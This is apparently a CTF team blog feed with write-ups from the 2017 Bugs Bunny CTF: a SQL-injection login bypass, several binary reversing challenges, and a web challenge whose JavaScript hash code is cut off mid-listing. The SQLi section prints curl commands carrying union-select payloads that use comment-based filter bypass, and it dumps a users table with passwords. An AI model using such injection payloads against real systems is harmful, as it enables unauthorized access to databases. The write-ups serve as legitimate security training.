<p>With changing the limit we leaked all the passwords from the users as we can see the first user gave us an incomplete flag the others don’t seem to be part of the flag since there isn’t any “_” separating the words so lets assume our flag ends like “_Easy_I_Dont_Think}”.<br>The rest of the flag must be in the username column!</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">kinyabitch@Debian ~/D/H/ctf&gt; curl "http://34.253.165.46/LQI_X/?username=test&amp;password=test'/**/union/**/select/**/username/**/from/**/users/**/limit/**/0,1--"</div><div class="line">No way SOrry</div></pre></td></tr></table></figure>
<p>Fuck they are filtering the username too? wee need another technique to get the username field! Lets try to make the query always true! and then inject an union query:</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">curl "http://34.253.165.46/LQI_X/?username=test&amp;password=test'or/**/1/**/union/**/select/**/\"a\"/**/limit/**/0,1/**/--"</div><div class="line">...</div><div class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"login-help"</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span> Bugs_Bunny&#123;SQLi_Easy_!!<span class="tag">&lt;/<span class="name">p</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></div><div class="line">...</div><div class="line">curl "http://34.253.165.46/LQI_X/?username=test&amp;password=test'or/**/1/**/union/**/select/**/\"a\"/**/limit/**/1,1/**/--"</div><div class="line">...</div><div class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"login-help"</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span> a<span class="tag">&lt;/<span class="name">p</span>&gt;</span></div><div class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></div><div class="line">...</div><div class="line">curl "http://34.253.165.46/LQI_X/?username=test&amp;password=test'or/**/1/**/union/**/select/**/\"a\"/**/limit/**/2,1/**/--"</div><div class="line">...</div><div class="line"> <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"login-help"</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span> flag_is<span class="tag">&lt;/<span class="name">p</span>&gt;</span></div><div class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></div><div class="line"></div><div class="line">...</div><div class="line">curl "http://34.253.165.46/LQI_X/?username=test&amp;password=test'or/**/1/**/union/**/select/**/\"a\"/**/limit/**/3,1/**/--"</div><div class="line">...</div><div class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"login-help"</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span> hello<span class="tag">&lt;/<span class="name">p</span>&gt;</span></div><div class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></div><div class="line">...</div><div class="line">curl "http://34.253.165.46/LQI_X/?username=test&amp;password=test'or/**/1/**/union/**/select/**/\"a\"/**/limit/**/4,1/**/--"</div><div class="line">...</div><div class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"login-help"</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span> so_2017!<span class="tag">&lt;/<span class="name">p</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></div><div class="line">...</div></pre></td></tr></table></figure>
<p>The flag is the combination of the some of this strings after some trial and error trying to login I could see that the login table is:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">Users</div><div class="line">id username                password</div><div class="line">1  hello                   hello</div><div class="line">2  flag_is                 here            </div><div class="line">3  Bugs_Bunny&#123;SQLi_Easy_!! _Easy_I_Dont_Think</div><div class="line">4  so_2017!                &#125; </div><div class="line">5  <span class="built_in">test</span>                    <span class="built_in">test</span></div></pre></td></tr></table></figure>
<p>So the flag is Bugs_Bunny{SQLi<em>Easy</em>!!_Easy_I_Dont_Thinkso_2017!}</p>
]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;&lt;br&gt;LQI_X&lt;br&gt;140&lt;br&gt;&lt;br&gt;Its for your , login and get all you need&lt;br&gt;&lt;br&gt;task : &lt;a href=&quot;http://34.253.165.46/LQI_X/&quot; target=&quot;_b
    
    </summary>
    
      <category term="Web" scheme="https://teamrocketist.github.io/categories/Web/"/>
    
    
      <category term="web" scheme="https://teamrocketist.github.io/tags/web/"/>
    
      <category term="sqli" scheme="https://teamrocketist.github.io/tags/sqli/"/>
    
      <category term="filterbypass" scheme="https://teamrocketist.github.io/tags/filterbypass/"/>
    
  </entry>
  
  <entry>
    <title>[Reverse] BugsBunny CTF - Rev75</title>
    <link href="https://teamrocketist.github.io/2017/08/01/Reverse-BugsBunny-CTF-Rev75/"/>
    <id>https://teamrocketist.github.io/2017/08/01/Reverse-BugsBunny-CTF-Rev75/</id>
    <published>2017-08-01T08:03:50.000Z</published>
    <updated>2017-08-10T02:53:58.861Z</updated>
    
    <content type="html"><![CDATA[<blockquote><br>rev100<br>100<br><br>Find me faster !<br><br>Author: Aymen Borgi<br></blockquote>

<p>At first by checking the main function we can observe that it leads us to nowhere either gives us the strings “bad password” or “good but no flag for you hihihi xD” if we gave the right password which could be found simply by debugging and break points.</p>
<p>Now the flag must be in another functions there is alot starting from a0 to a814<br><img src="https://i.imgur.com/1sxwXmB.png"></p>
<p>By checking one of them we can see it contains a string that looks like they are encoded by base64<br><img src="https://i.imgur.com/knuiupq.png"></p>
<p>My plan was to copy all disassembled code from this functions and then use regex to get all the strings between quotes and concatenate them. After that I decoded the string and got a png image with the flag! here is the script:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">strings = <span class="string">""</span></div><div class="line">fh = open(<span class="string">"flag.png"</span>, <span class="string">"wb"</span>)</div><div class="line">fh.write(base64.b64decode(strings))</div><div class="line">fh.close()</div></pre></td></tr></table></figure>
<p>And now the flag<br><img src="https://i.imgur.com/MHU2qE0.png"></p>
]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;&lt;br&gt;rev100&lt;br&gt;100&lt;br&gt;&lt;br&gt;Find me faster !&lt;br&gt;&lt;br&gt;Author: Aymen Borgi&lt;br&gt;&lt;/blockquote&gt;

&lt;p&gt;At first by checking the main function
    
    </summary>
    
      <category term="Reverse" scheme="https://teamrocketist.github.io/categories/Reverse/"/>
    
    
      <category term="reverse" scheme="https://teamrocketist.github.io/tags/reverse/"/>
    
      <category term="base64" scheme="https://teamrocketist.github.io/tags/base64/"/>
    
  </entry>
  
  <entry>
    <title>[Reverse] Bugs Bunny CTF - Rev100</title>
    <link href="https://teamrocketist.github.io/2017/07/31/Reverse-Bugs-Bunny-CTF-Rev100/"/>
    <id>https://teamrocketist.github.io/2017/07/31/Reverse-Bugs-Bunny-CTF-Rev100/</id>
    <published>2017-07-31T15:14:17.000Z</published>
    <updated>2017-08-10T03:13:15.198Z</updated>
    
    <content type="html"><![CDATA[<p><blockquote><br>Find me faster !<br>Author: Aymen Borgi<br><a href="http://www.bugsbunnyctf.me/files/90e28c48809978263ae21beca17607aa/rev100.zip" target="_blank" rel="external">rev100.zip</a></blockquote><br>Starting to open our executable file on IDA:<br><a href="https://i.imgur.com/OA4oL0f.png" target="_blank" rel="external"><img src="https://i.imgur.com/OA4oL0f.png"></a><br><a href="https://i.imgur.com/bcszDk1.png" target="_blank" rel="external"><img src="https://i.imgur.com/bcszDk1.png"></a><br>There is some weird shit going around but we can see a function i_am_debugged() which leads you to exit the program if you running the program on a debugger like gdb or even IDA, there is alot of calls as you can see in the assembly code I could run the debugger and change those registers to not jump out of the program but since there was alot of calls I chose to do it in another way.<br>After a while I found this “loop” in the assembly code we can see they are just xoring two strange strings, variable “a” and variable “b” and then saving it on variable “c”.<br><a href="https://i.imgur.com/bcszDk1.png" target="_blank" rel="external"><img src="https://i.imgur.com/eP3TjL4.png"></a><br>Now we just need to find those “a” and “b” initial values and convert this assembly into python.<br>Finding “a” and “b” values is easy we can use IDA to do that:<br><a href="https://i.imgur.com/w7a1Tsf.png" target="_blank" rel="external"><img src="https://i.imgur.com/w7a1Tsf.png"></a><br><a href="https://i.imgur.com/TNlzG7X.png" target="_blank" rel="external"><img src="https://i.imgur.com/TNlzG7X.png"></a><br>Now we just write a python script equivalent to this assembly (Notice that wrote the strings in python as hex bytes because some characters weren’t pritable):</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">a = <span class="string">'\x61\x41\x40\x37\x6d\x77\x34\x2c\x5f\x41\x42\x60\x07\x34\x7d\x12\x57\x7a\x22\x25\x4f\x28'</span></div><div class="line">b = <span class="string">'\x23\x34\x27\x44\x32\x35\x41\x42\x31\x38\x39\x38\x37\x46\x22\x23\x24\x25\x44\x50\x21\x55'</span> </div><div class="line">c = <span class="string">''</span></div><div class="line">v4 = len(a) + <span class="number">1</span></div><div class="line">v5 = len(b) + <span class="number">1</span></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, v4<span class="number">-1</span>):</div><div class="line">	c += chr(ord(a[i])^ord(b[i]))</div><div class="line">	<span class="keyword">print</span> c</div><div class="line"><span class="keyword">print</span> c</div></pre></td></tr></table></figure>
<p>Running the script:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">kinyabitch@Debian ~/D/H/ctf&gt; python rev100.py </div><div class="line">Bugs_Bunny&#123;X0r_1s_fun&#125;</div></pre></td></tr></table></figure>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;blockquote&gt;&lt;br&gt;Find me faster !&lt;br&gt;Author: Aymen Borgi&lt;br&gt;&lt;a href=&quot;http://www.bugsbunnyctf.me/files/90e28c48809978263ae21beca17607aa/rev
    
    </summary>
    
      <category term="Reverse" scheme="https://teamrocketist.github.io/categories/Reverse/"/>
    
    
      <category term="reverse" scheme="https://teamrocketist.github.io/tags/reverse/"/>
    
      <category term="xor" scheme="https://teamrocketist.github.io/tags/xor/"/>
    
  </entry>
  
  <entry>
    <title>[Reverse] - Bugs Bunny CTF - Rev 50</title>
    <link href="https://teamrocketist.github.io/2017/07/31/Reverse-Bugs-Bunny-CTF-Rev-50/"/>
    <id>https://teamrocketist.github.io/2017/07/31/Reverse-Bugs-Bunny-CTF-Rev-50/</id>
    <published>2017-07-31T14:16:03.000Z</published>
    <updated>2017-08-10T02:54:39.509Z</updated>
    
    <content type="html"><![CDATA[<blockquote><br>only guess<br>50<br><br>Reverse Engineering … ooh no need !<br><br>put the right password between Bugs_Bunny{…}<br><br>Author: Aymen Borgi</blockquote>

<p>Starting by Executing the file:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">kinyabitch@Debian ~/D/H/ctf&gt; rev50/rev50</div><div class="line">usage ./rev50 password</div></pre></td></tr></table></figure>
<p>Using the ida pro to check all the strings in the program we can see there were alot of them so we can’t really guess which one is it without analysing the program itself<br><a href="https://i.imgur.com/VDQWzIO.png" target="_blank" rel="external"><img src="https://i.imgur.com/VDQWzIO.png" title="Strings IDA"></a></p>
<p>Checking out the main function with ida pro we can see:<br><a href="https://i.imgur.com/uQUkKj4.png" target="_blank" rel="external"><img src="https://i.imgur.com/uQUkKj4.png" title="Strings IDA"></a></p>
<p>We now can see where our program is checking if the flag is correct if we manage to check value of the register RAX register before that strcmp ocurrs.<br><a href="https://i.imgur.com/f6sbpUa.png" target="_blank" rel="external"><img src="https://i.imgur.com/f6sbpUa.png" title="Strings IDA"></a></p>
<p>I could use IDA to check those values but since is alot of trouble to do remote execute the file in a linux machine (I was executing ida in a windows VM machine) to not loose time I rather preferred to check the value on GDB:</p>
<p>Disassembling the main function<br><a href="https://i.imgur.com/2pmO6za.png" target="_blank" rel="external"><img src="https://i.imgur.com/2pmO6za.png" title="Strings IDA"></a><br>Identify the address and do a break point and checking the value on the register RAX<br><a href="https://i.imgur.com/pdA9uxN.png" target="_blank" rel="external"><img src="https://i.imgur.com/pdA9uxN.png" title="Strings IDA"></a><br>Rerunning the program with the password “mercedes”<br><a href="https://i.imgur.com/SEuMGX1.png" target="_blank" rel="external"><img src="https://i.imgur.com/SEuMGX1.png" title="Strings IDA"></a><br>Finally our flag is BugsBunny{mercedes}</p>
]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;&lt;br&gt;only guess&lt;br&gt;50&lt;br&gt;&lt;br&gt;Reverse Engineering … ooh no need !&lt;br&gt;&lt;br&gt;put the right password between Bugs_Bunny{…}&lt;br&gt;&lt;br&gt;Autho
    
    </summary>
    
      <category term="Reverse" scheme="https://teamrocketist.github.io/categories/Reverse/"/>
    
    
      <category term="reverse" scheme="https://teamrocketist.github.io/tags/reverse/"/>
    
      <category term="gdb" scheme="https://teamrocketist.github.io/tags/gdb/"/>
    
  </entry>
  
  <entry>
    <title>[Web] Bugs Bunny Ctf - Web 100</title>
    <link href="https://teamrocketist.github.io/2017/07/31/Web-Bugs-Bunny-Ctf-Web-100/"/>
    <id>https://teamrocketist.github.io/2017/07/31/Web-Bugs-Bunny-Ctf-Web-100/</id>
    <published>2017-07-31T10:50:11.000Z</published>
    <updated>2017-08-10T02:58:59.505Z</updated>
    
    <content type="html"><![CDATA[<blockquote><br>Web100<br>100<br><br>My secure system is secure even you have my code<br><a href="http://52.53.151.123/web/web100.html" target="_blank" rel="external">http://52.53.151.123/web/web100.html</a><br></blockquote>

<p>This one was fairly easy the first thing that showed up on the web page was a http auth which was asking for a password my first thought was to bruteforce the password but first I checked up the website executing the command curl with bash:</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">curl <span class="string">'http://52.53.151.123/web/web100.html'</span></div></pre></td></tr></table></figure>
<p>And then showed up some javascript code:</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div><div class="line">156</div><div class="line">157</div><div class="line">158</div><div class="line">159</div><div class="line">160</div><div class="line">161</div><div class="line">162</div><div class="line">163</div><div class="line">164</div><div class="line">165</div><div class="line">166</div><div class="line">167</div><div class="line">168</div><div class="line">169</div><div class="line">170</div><div class="line">171</div><div class="line">172</div><div class="line">173</div><div class="line">174</div><div class="line">175</div><div class="line">176</div><div class="line">177</div><div class="line">178</div><div class="line">179</div><div class="line">180</div><div class="line">181</div><div class="line">182</div><div class="line">183</div><div class="line">184</div><div class="line">185</div><div class="line">186</div><div class="line">187</div><div class="line">188</div><div class="line">189</div><div class="line">190</div><div class="line">191</div><div class="line">192</div><div class="line">193</div><div class="line">194</div><div class="line">195</div><div class="line">196</div><div class="line">197</div><div class="line">198</div><div class="line">199</div><div class="line">200</div><div class="line">201</div><div class="line">202</div><div class="line">203</div><div class="line">204</div><div class="line">205</div><div class="line">206</div><div class="line">207</div><div class="line">208</div><div class="line">209</div><div class="line">210</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="keyword">var</span> generate = <span class="function"><span class="keyword">function</span>(<span class="params">string</span>) </span>&#123;</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">function</span> <span class="title">RT</span>(<span class="params">lValue, iShiftBits</span>) </span>&#123;</div><div class="line">        <span class="keyword">return</span> (lValue &lt;&lt; iShiftBits) | (lValue &gt;&gt;&gt; (<span class="number">32</span> - iShiftBits));</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">function</span> <span class="title">AU</span>(<span class="params">lX, lY</span>) </span>&#123;</div><div class="line">        <span class="keyword">var</span> lX4, lY4, lX8, lY8, lResult;</div><div class="line">        lX8 = (lX &amp; <span class="number">0x80000000</span>);</div><div class="line">        lY8 = (lY &amp; <span class="number">0x80000000</span>);</div><div class="line">        lX4 = (lX &amp; <span class="number">0x40000000</span>);</div><div class="line">        lY4 = (lY &amp; <span class="number">0x40000000</span>);</div><div class="line">        lResult = (lX &amp; <span class="number">0x3FFFFFFF</span>) + (lY &amp; <span class="number">0x3FFFFFFF</span>);</div><div class="line">        <span class="keyword">if</span> (lX4 &amp; lY4) &#123;</div><div class="line">            <span class="keyword">return</span> (lResult ^ <span class="number">0x80000000</span> ^ lX8 ^ lY8);</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">if</span> (lX4 | lY4) &#123;</div><div class="line">            <span class="keyword">if</span> (lResult &amp; <span class="number">0x40000000</span>) &#123;</div><div class="line">                <span class="keyword">return</span> (lResult ^ <span class="number">0xC0000000</span> ^ lX8 ^ lY8);</div><div class="line">            &#125; <span class="keyword">else</span> &#123;</div><div class="line">                <span class="keyword">return</span> (lResult ^ <span class="number">0x40000000</span> ^ lX8 ^ lY8);</div><div class="line">            &#125;</div><div class="line">        &#125; <span class="keyword">else</span> &#123;</div><div class="line">            <span class="keyword">return</span> (lResult ^ lX8 ^ lY8);</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="function"><span class="keyword">function</span> <span class="title">F</span>(<span class="params">x, y, z</span>) </span>&#123; <span class="keyword">return</span> (x &amp; y) | ((~x) &amp; z); &#125;</div><div class="line">    <span class="function"><span class="keyword">function</span> <span class="title">G</span>(<span class="params">x, y, z</span>) </span>&#123; <span class="keyword">return</span> (x &amp; z) | (y &amp; (~z)); &#125;</div><div class="line">    <span class="function"><span class="keyword">function</span> <span class="title">H</span>(<span class="params">x, y, z</span>) </span>&#123; <span class="keyword">return</span> (x ^ y ^ z); &#125;</div><div class="line">    <span class="function"><span class="keyword">function</span> <span class="title">I</span>(<span class="params">x, y, z</span>) </span>&#123; <span class="keyword">return</span> (y ^ (x | (~z))); &#125;</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">function</span> <span class="title">FF</span>(<span class="params">a, b, c, d, x, s, ac</span>) </span>&#123;</div><div class="line">        a = AU(a, AU(AU(F(b, c, d), x), ac));</div><div class="line">        <span class="keyword">return</span> AU(RT(a, s), b);</div><div class="line">    &#125;;</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">function</span> <span class="title">GG</span>(<span class="params">a, b, c, d, x, s, ac</span>) </span>&#123;</div><div class="line">        a = AU(a, AU(AU(G(b, c, d), x), ac));</div><div class="line">        <span class="keyword">return</span> AU(RT(a, s), b);</div><div class="line">    &#125;;</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">function</span> <span class="title">HH</span>(<span class="params">a, b, c, d, x, s, ac</span>) </span>&#123;</div><div class="line">        a = AU(a, AU(AU(H(b, c, d), x), ac));</div><div class="line">        <span class="keyword">return</span> AU(RT(a, s), b);</div><div class="line">    &#125;;</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">function</span> <span class="title">II</span>(<span class="params">a, b, c, d, x, s, ac</span>) </span>&#123;</div><div class="line">        a = AU(a, AU(AU(I(b, c, d), x), ac));</div><div class="line">        <span class="keyword">return</span> AU(RT(a, s), b);</div><div class="line">    &#125;;</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">function</span> <span class="title">CTWA</span>(<span class="params">bytes</span>) </span>&#123;</div><div class="line">        <span class="keyword">var</span> lWordCount;</div><div class="line">        <span class="keyword">var</span> lMessageLength = bytes.length;</div><div class="line">        <span class="keyword">var</span> lNumberOfWords_temp1 = lMessageLength + <span class="number">8</span>;</div><div class="line">        <span class="keyword">var</span> lNumberOfWords_temp2 = (lNumberOfWords_temp1 - (lNumberOfWords_temp1 % <span class="number">64</span>)) / <span class="number">64</span>;</div><div class="line">        <span class="keyword">var</span> lNumberOfWords = (lNumberOfWords_temp2 + <span class="number">1</span>) * <span class="number">16</span>;</div><div class="line">        <span class="keyword">var</span> lWordArray = <span class="built_in">Array</span>(lNumberOfWords - <span class="number">1</span>);</div><div class="line">        <span class="keyword">var</span> lBytePosition = <span class="number">0</span>;</div><div class="line">        <span class="keyword">var</span> lByteCount = <span class="number">0</span>;</div><div class="line">        <span class="keyword">while</span> (lByteCount &lt; lMessageLength) &#123;</div><div class="line">            lWordCount = (lByteCount - (lByteCount % <span class="number">4</span>)) / <span class="number">4</span>;</div><div class="line">            lBytePosition = (lByteCount % <span class="number">4</span>) * <span class="number">8</span>;</div><div class="line">            lWordArray[lWordCount] = (lWordArray[lWordCount] | (bytes[lByteCount] &lt;&lt; lBytePosition));</div><div class="line">            lByteCount++;</div><div class="line">        &#125;</div><div class="line">        lWordCount = (lByteCount - (lByteCount % <span class="number">4</span>)) / <span class="number">4</span>;</div><div class="line">        lBytePosition = (lByteCount % <span class="number">4</span>) * <span class="number">8</span>;</div><div class="line">        lWordArray[lWordCount] = lWordArray[lWordCount] | (<span class="number">0x80</span> &lt;&lt; lBytePosition);</div><div class="line">        lWordArray[lNumberOfWords - <span class="number">2</span>] = lMessageLength &lt;&lt; <span class="number">3</span>;</div><div class="line">        lWordArray[lNumberOfWords - <span class="number">1</span>] = lMessageLength &gt;&gt;&gt; <span class="number">29</span>;</div><div class="line">        <span class="keyword">return</span> lWordArray;</div><div class="line">    &#125;;</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">function</span> <span class="title">WordToHex</span>(<span class="params">lValue</span>) </span>&#123;</div><div class="line">        <span class="keyword">var</span> WordToHexValue = <span class="string">""</span>, WordToHexValue_temp = <span class="string">""</span>, lByte, lCount;</div><div class="line">        <span class="keyword">for</span> (lCount = <span class="number">0</span>; lCount &lt;= <span class="number">3</span>; lCount++) &#123;</div><div class="line">            lByte = (lValue &gt;&gt;&gt; (lCount * <span class="number">8</span>)) &amp; <span class="number">255</span>;</div><div class="line">            WordToHexValue_temp = <span class="string">"0"</span> + lByte.toString(<span class="number">16</span>);</div><div class="line">            WordToHexValue = WordToHexValue + WordToHexValue_temp.substr(WordToHexValue_temp.length - <span class="number">2</span>, <span class="number">2</span>);</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">return</span> WordToHexValue;</div><div class="line">    &#125;;</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">function</span> <span class="title">Utf8Encode</span>(<span class="params">string</span>) </span>&#123;</div><div class="line">        string = string.replace(<span class="regexp">/\r\n/g</span>, <span class="string">"\n"</span>);</div><div class="line">        <span class="keyword">var</span> result = <span class="built_in">Array</span>();</div><div class="line"></div><div class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> n = <span class="number">0</span>; n &lt; string.length; n++) &#123;</div><div class="line"></div><div class="line">            <span class="keyword">var</span> c = string.charCodeAt(n);</div><div class="line"></div><div class="line">            <span class="keyword">if</span> (c &lt; <span class="number">128</span>) &#123;</div><div class="line">                result.push(c);</div><div class="line">            &#125;</div><div class="line">            <span class="keyword">else</span> <span class="keyword">if</span> ((c &gt; <span class="number">127</span>) &amp;&amp; (c &lt; <span class="number">2048</span>)) &#123;</div><div class="line">                result.push((c &gt;&gt; <span class="number">6</span>) | <span class="number">192</span>);</div><div class="line">                result.push((c &amp; <span class="number">63</span>) | <span class="number">128</span>);</div><div class="line">            &#125;</div><div class="line">            <span class="keyword">else</span> &#123;</div><div class="line">                result.push((c &gt;&gt; <span class="number">12</span>) | <span class="number">224</span>);</div><div class="line">                result.push(((c &gt;&gt; <span class="number">6</span>) &amp; <span class="number">63</span>) | <span class="number">128</span>);</div><div class="line">                result.push((c &amp; <span class="number">63</span>) | <span class="number">128</span>);</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">return</span> result;</div><div class="line">    &#125;;</div><div class="line"></div><div class="line">    <span class="keyword">var</span> x = <span class="built_in">Array</span>();</div><div class="line">    <span class="keyword">var</span> k, AA, BB, CC, DD, a, b, c, d;</div><div class="line">    <span class="keyword">var</span> S11 = <span class="number">7</span>, S12 = <span class="number">12</span>, S13 = <span class="number">17</span>, S14 = <span class="number">22</span>;</div><div class="line">    <span class="keyword">var</span> S21 = <span class="number">5</span>, S22 = <span class="number">9</span>, S23 = <span class="number">14</span>, S24 = <span class="number">20</span>;</div><div class="line">    <span class="keyword">var</span> S31 = <span class="number">4</span>, S32 = <span class="number">11</span>, S33 = <span class="number">16</span>, S34 = <span class="number">23</span>;</div><div class="line">    <span class="keyword">var</span> S41 = <span class="number">6</span>, S42 = <span class="number">10</span>, S43 = <span class="number">15</span>, S44 = <span class="number">21</span>;</div><div class="line"></div><div class="line">    <span class="keyword">var</span> bytes = Utf8Encode(string);</div><div class="line">    x = CTWA(bytes);</div><div class="line"></div><div class="line">    a = <span class="number">0x67452301</span>; b = <span class="number">0xEFCDAB89</span>; c = <span class="number">0x98BADCFE</span>; d = <span class="number">0x10325476</span>;</div><div class="line"></div><div class="line">    <span class="keyword">for</span> (k = <span class="number">0</span>; k &lt; x.length; k += <span class="number">16</span>) &#123;</div><div class="line">        AA = a; BB = b; CC = c; DD = d;</div><div class="line">        a = FF(a, b, c, d, x[k + <span class="number">0</span>], S11, <span class="number">0xD76AA478</span>);</div><div class="line">        d = FF(d, a, b, c, x[k + <span class="number">1</span>], S12, <span class="number">0xE8C7B756</span>);</div><div class="line">        c = FF(c, d, a, b, x[k + <span class="number">2</span>], S13, <span class="number">0x242070DB</span>);</div><div class="line">        b = FF(b, c, d, a, x[k + <span class="number">3</span>], S14, <span class="number">0xC1BDCEEE</span>);</div><div class="line">        a = FF(a, b, c, d, x[k + <span class="number">4</span>], S11, <span class="number">0xF57C0FAF</span>);</div><div class="line">        d = FF(d, a, b, c, x[k + <span class="number">5</span>], S12, <span class="number">0x4787C62A</span>);</div><div class="line">        c = FF(c, d, a, b, x[k + <span class="number">6</span>], S13, <span class="number">0xA8304613</span>);</div><div class="line">        b = FF(b, c, d, a, x[k + <span class="number">7</span>], S14, <span class="number">0xFD469501</span>);</div><div class="line">        a = FF(a, b, c, d, x[k + <span class="number">8</span>], S11, 